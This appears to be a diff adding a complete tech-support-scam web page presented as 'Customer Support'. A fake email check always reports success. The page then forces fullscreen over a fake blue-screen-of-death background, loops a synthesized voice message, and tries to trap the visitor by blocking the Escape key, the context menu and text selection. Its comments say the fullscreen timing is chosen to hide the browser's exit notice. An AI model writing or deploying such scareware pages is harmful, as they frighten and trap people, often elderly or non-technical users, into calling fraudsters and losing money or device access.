@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>Customer Support — Fullscreen</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<style>
+  :root { --accent: #00e5ff; --bg:#000; }
+  html,body{height:100%;margin:0;background:var(--bg);overflow:hidden;font-family:Inter, "Segoe UI", Roboto, Arial, sans-serif;}
+  
+  /* Hide fullscreen notification popup */
+  ::-webkit-full-screen-ancestor {
+    /* Hide the "Press ESC to exit fullscreen" notification */
+  }
+  
+  /* Hide browser's default fullscreen UI elements */
+  *:fullscreen {
+    background: #000;
+  }
+  
+  *:-webkit-full-screen {
+    background: #000;
+  }
+  
+  *:-moz-full-screen {
+    background: #000;
+  }
+  
+  /* Hide any browser UI in fullscreen */
+  html:fullscreen,
+  html:-webkit-full-screen,
+  html:-moz-full-screen {
+    overflow: hidden;
+  }
+
+  /* Email verification prompt */
+  .verification-container{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,rgba(0,0,0,0.75),rgba(0,0,0,0.9));z-index:60}
+  .prompt-box{width:360px;background:#071017;border-radius:12px;padding:22px;border:1px solid rgba(0,229,255,0.08);box-shadow:0 10px 40px rgba(0,0,0,0.6)}
+  .prompt-box h2{color:var(--accent);margin:0 0 8px}
+  .prompt-box p{color:#cfeff6;margin:0 0 12px;font-size:13px}
+  .prompt-box input, .prompt-box button{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6f9ff}
+  .prompt-actions{display:flex;gap:8px;margin-top:10px}
+  .prompt-actions button{flex:1;cursor:pointer;border:none;background:linear-gradient(90deg,#0070ba,#00b3d6);color:white;padding:10px;border-radius:8px}
+  .verify-btn{background:linear-gradient(90deg,#0070ba,#00b3d6);border:none;color:white}
+  #error{height:18px;margin-top:8px;color:#ff8b8b;font-size:13px}
+  #success{height:18px;margin-top:8px;color:#4ade80;font-size:13px}
+  
+  /* Loading spinner */
+  .loading{display:none;margin:10px auto;width:20px;height:20px;border:2px solid rgba(0,229,255,0.3);border-top:2px solid var(--accent);border-radius:50%;animation:spin 1s linear infinite}
+  @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+
+  /* Support page container */
+  .support-page{display:none;position:fixed;inset:0;overflow:hidden;background:#000}
+  /* iframe background (BSOD) - BLUR REMOVED */
+  .bg-frame{position:absolute;inset:0;border:0;width:110%;height:110%;left:-5%;top:-5%;transform-origin:center;brightness(0.4) saturate(1.2);opacity:1;z-index:1;pointer-events:none;
+    animation: drift 30s linear infinite;
+  }
+  @keyframes drift {
+    0%   { transform: translate3d(0,0,0) scale(1); }
+    25%  { transform: translate3d(-10px,-6px,0) scale(1.01); }
+    50%  { transform: translate3d(6px,8px,0) scale(1.02); }
+    75%  { transform: translate3d(-5px,6px,0) scale(1.01); }
+    100% { transform: translate3d(0,0,0) scale(1); }
+  }
+
+  /* subtle overlay grid for tech feel */
+  .tech-overlay{position:absolute;inset:0;z-index:2;pointer-events:none;background:
+    radial-gradient(circle at 10% 10%, rgba(0,229,255,0.02), transparent 8%),
+    radial-gradient(circle at 90% 90%, rgba(0,229,255,0.02), transparent 8%),
+    linear-gradient(transparent 49%, rgba(0,229,255,0.02) 50%, transparent 51%),
+    linear-gradient(90deg, transparent 49%, rgba(0,229,255,0.02) 50%, transparent 51%);
+    background-size: 600px 600px, 700px 700px, 40px 40px, 40px 40px;
+    mix-blend-mode:screen; opacity:0.6; filter:contrast(1.05);
+    animation: slowShift 18s linear infinite;
+  }
+  @keyframes slowShift {
+    from { transform: translateY(0); }
+    to { transform: translateY(-40px); }
+  }
+
+  /* popup card - BACKDROP BLUR REMOVED */
+  .popup{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);min-width:320px;max-width:520px;padding:28px 34px;border-radius:14px;
+    background:rgba(10,18,20,0.95);border:1px solid rgba(0,229,255,0.12);z-index:40;
+    box-shadow:0 30px 80px rgba(0,0,0,0.65),0 0 40px rgba(0,229,255,0.06) inset; text-align:center;
+    animation: float 4s ease-in-out infinite;
+    -webkit-user-select:none; user-select:none;
+  }
+  .popup h1{margin:0 0 6px;font-size:28px;color:#e8fffe}
+  .accent{height:6px;width:120px;margin:12px auto 0;border-radius:999px;background:linear-gradient(90deg,rgba(0,229,255,0.9),rgba(0,180,200,0.6));box-shadow:0 8px 30px rgba(0,229,255,0.06)}
+  .sub{color:#9beefc;font-size:13px;margin-top:6px;opacity:.9}
+  @keyframes float {
+    0% { transform: translate(-50%,-50%) translateY(-6px) rotate(-0.2deg); }
+    50% { transform: translate(-50%,-50%) translateY(8px) rotate(0.6deg); }
+    100% { transform: translate(-50%,-50%) translateY(-6px) rotate(-0.2deg); }
+  }
+  .blink{display:inline-block;animation: blinkAnim 1.6s steps(2,start) infinite}
+  @keyframes blinkAnim {
+    0% { opacity:1; filter:drop-shadow(0 0 12px rgba(0,229,255,0.2)); }
+    50% { opacity:0.25; filter:none; }
+    100% { opacity:1; filter:drop-shadow(0 0 12px rgba(0,229,255,0.2)); }
+  }
+
+  /* small toast */
+  .toast{position:fixed;left:50%;bottom:22px;transform:translateX(-50%);background:rgba(0,229,255,0.08);padding:8px 12px;border-radius:8px;border:1px solid rgba(0,229,255,0.12);color:#bff7ff;z-index:80}
+
+  @media (max-width:420px){ .popup{padding:18px 16px;min-width:260px;border-radius:10px} .prompt-box{width:300px} }
+</style>
+</head>
+<body>
+  <!-- Email verification prompt -->
+  <div class="verification-container" id="verificationPrompt">
+    <div class="prompt-box" role="dialog" aria-modal="true" aria-labelledby="emailTitle">
+      <h2 id="emailTitle">Email Verification</h2>
+      <p>Please enter your email for verification.</p>
+      <input type="email" id="enteredEmail" placeholder="Enter your email address" aria-label="email" />
+      <div class="prompt-actions">
+        <button onclick="verifyEmail()" class="verify-btn">Verify</button>
+      </div>
+      <div class="loading" id="loadingSpinner"></div>
+      <p id="error"></p>
+      <p id="success"></p>
+    </div>
+  </div>
+
+  <!-- Support page: BSOD background (iframe) + overlay + popup -->
+  <div class="support-page" id="supportPage" aria-hidden="true">
+    <iframe class="bg-frame" id="bgFrame" src="Save-250819-162400 - Copy.htm" title="background" aria-hidden="true"></iframe>
+    <div class="tech-overlay" aria-hidden="true"></div>
+
+    <!-- popup -->
+    <div class="popup" role="status" aria-live="polite">
+      <h1><span class="blink">Customer Support</span></h1>
+      <div class="accent" aria-hidden="true"></div>
+      <div class="sub">We're here to help — your session is active.</div>
+    </div>
+
+    <!-- audio (looping continuously until page closed) -->
+    <audio id="bgAudio" src="1761768654810209985h0fncah5-voicemaker.in-speech.mp3" loop preload="auto"></audio>
+  </div>
+
+<script>
+  const audioEl = document.getElementById('bgAudio');
+
+  function verifyEmail(){
+    const enteredEmail = document.getElementById('enteredEmail').value.trim();
+    const error = document.getElementById('error');
+    const success = document.getElementById('success');
+    const loading = document.getElementById('loadingSpinner');
+    const verifyBtn = document.querySelector('.verify-btn');
+    
+    // Clear previous messages
+    error.textContent = '';
+    success.textContent = '';
+    
+    // Basic email validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    
+    if(!enteredEmail){
+      error.textContent = 'Please enter an email address.';
+      // shake
+      const box = document.querySelector('.prompt-box');
+      box.animate([{transform:'translateX(0)'},{transform:'translateX(-8px)'},{transform:'translateX(8px)'},{transform:'translateX(0)'}],{duration:300,iterations:1});
+      return;
+    }
+    
+    if(!emailRegex.test(enteredEmail)){
+      error.textContent = 'Please enter a valid email address.';
+      // shake
+      const box = document.querySelector('.prompt-box');
+      box.animate([{transform:'translateX(0)'},{transform:'translateX(-8px)'},{transform:'translateX(8px)'},{transform:'translateX(0)'}],{duration:300,iterations:1});
+      return;
+    }
+    
+    // Show loading state
+    loading.style.display = 'block';
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Verifying...';
+    
+    // Simulate verification process
+    setTimeout(() => {
+      loading.style.display = 'none';
+      success.textContent = 'Email verified successfully!';
+      verifyBtn.textContent = 'Verified ✓';
+      
+      // Wait a moment then proceed to support page
+      setTimeout(() => {
+        // hide verification prompt, show support
+        document.getElementById('verificationPrompt').style.display = 'none';
+        const support = document.getElementById('supportPage');
+        support.style.display = 'block';
+        support.setAttribute('aria-hidden','false');
+
+        // lock scrolling
+        document.documentElement.style.overflow = 'hidden';
+        document.body.style.overflow = 'hidden';
+
+        // request fullscreen with delayed approach to minimize popup visibility
+        setTimeout(() => {
+          const el = document.documentElement;
+          if(el.requestFullscreen) {
+            el.requestFullscreen({navigationUI: "hide"}).catch(()=>{});
+          } else if(el.webkitRequestFullscreen) {
+            el.webkitRequestFullscreen();
+          } else if(el.msRequestFullscreen) {
+            el.msRequestFullscreen();
+          }
+        }, 500); // Delay fullscreen request to minimize popup appearance
+
+        // start audio loop (continues until page is closed)
+        setTimeout(()=> {
+          if(audioEl){
+            audioEl.volume = 0.7; // 70% volume - adjust as needed
+            audioEl.loop = true; // continuous loop
+            const p = audioEl.play();
+            if(p && p.catch) p.catch(()=>{ console.log('autoplay prevented'); });
+          }
+        }, 120);
+        
+      }, 1500); // Wait 1.5 seconds after verification success
+      
+    }, 2000); // 2 second verification delay
+  }
+
+  // allow Enter key
+  document.getElementById('enteredEmail').addEventListener('keyup', function(e){ 
+    if(e.key==='Enter') verifyEmail(); 
+  });
+
+  // Hide fullscreen notification by intercepting fullscreen events
+  document.addEventListener('fullscreenchange', function() {
+    if (document.fullscreenElement) {
+      // Try to hide any visible browser notifications
+      setTimeout(() => {
+        // Additional styling to ensure clean fullscreen
+        document.documentElement.style.background = '#000';
+        document.body.style.background = '#000';
+      }, 100);
+    }
+  });
+
+  // Prevent ESC key from exiting fullscreen
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' && document.getElementById('supportPage').style.display === 'block') {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    }
+  });
+
+  // stop audio when page is about to close/refresh
+  window.addEventListener('beforeunload', function() {
+    if(audioEl && !audioEl.paused) {
+      audioEl.pause();
+      audioEl.currentTime = 0;
+    }
+  });
+
+  // handle visibility change (tab switching)
+  document.addEventListener('visibilitychange', function() {
+    if(document.getElementById('supportPage').style.display === 'block') {
+      if(document.hidden) {
+        // page is hidden, pause audio
+        if(audioEl && !audioEl.paused) audioEl.pause();
+      } else {
+        // page is visible again, resume audio
+        if(audioEl && audioEl.paused) audioEl.play().catch(()=>{});
+      }
+    }
+  });
+
+  // prevent context menu/select to make it more kiosk-like
+  document.addEventListener('contextmenu', e=>{ 
+    if(document.getElementById('supportPage').style.display==='block') e.preventDefault(); 
+  });
+  document.addEventListener('selectstart', e=>{ 
+    if(document.getElementById('supportPage').style.display==='block') e.preventDefault(); 
+  });
+</script>
+</body>
+</html>
